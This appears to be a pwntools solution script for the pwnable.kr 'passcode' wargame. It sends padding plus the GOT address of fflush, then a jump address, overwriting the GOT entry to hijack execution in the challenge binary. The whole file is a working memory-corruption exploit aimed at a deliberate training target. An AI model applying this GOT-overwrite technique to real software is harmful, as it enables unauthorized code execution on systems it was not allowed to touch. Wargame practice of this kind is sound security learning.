from pwn import *
context.log_level = 'debug'
context.terminal = ['terminator','-x','bash','-c']
rr = 1
if rr:
	cn = ssh(host='pwnable.kr',user='passcode',password='guest',port=2222).process("./passcode")
else:
	cn = process('./passcode')

bin = ELF('./passcode')

cn.recv()
cn.sendline('a'*96+p32(bin.got['fflush']))
cn.recv()


cn.sendline(str(0x080485E3))

print cn.recv()